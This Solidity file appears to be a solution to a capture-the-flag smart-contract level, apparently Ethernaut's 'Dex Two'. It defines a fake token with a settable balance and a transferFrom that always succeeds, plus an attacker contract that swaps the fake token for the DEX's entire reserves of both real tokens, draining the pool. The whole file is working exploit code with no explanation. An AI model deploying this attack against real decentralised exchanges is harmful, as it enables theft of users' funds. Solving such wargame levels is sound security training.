// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface IDex2 {
    function approve(address spender, uint amount) external;
    function swap(address from, address to, uint amount) external;
    function balanceOf(address token, address account) external view returns (uint);
    function getSwapPrice(address from, address to, uint amount) external view returns(uint);
    function token1() external view returns(address);
    function token2() external view returns(address);
}

contract FakeToken {
    address private _dex;

    uint256 balance;

    function setBalance(uint256 amount) external {
        balance = amount;
    }   

    function balanceOf(address token) public view returns (uint){
        return balance;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        return true;
    }
}


contract TokenSwapDex2 {

    IDex2 dex;
    FakeToken public fakeToken;
    address tokenOne;
    address tokenTwo;
    address owner;

    constructor(address _dex) {
        fakeToken = new FakeToken();
        dex = IDex2(_dex);
        tokenOne = dex.token1();
        tokenTwo = dex.token2();
        owner = msg.sender;
    }

    function SwapTokens() external {
        uint256 tokenBalance = dex.balanceOf(tokenOne, address(dex));
        fakeToken.setBalance(tokenBalance);
        dex.swap(address(fakeToken), tokenOne, tokenBalance);

        tokenBalance = dex.balanceOf(tokenTwo, address(dex));
        fakeToken.setBalance(tokenBalance);
        dex.swap(address(fakeToken), tokenTwo, tokenBalance);
    }

    function approve() external {
      dex.approve(owner, 10000000);
    }

}
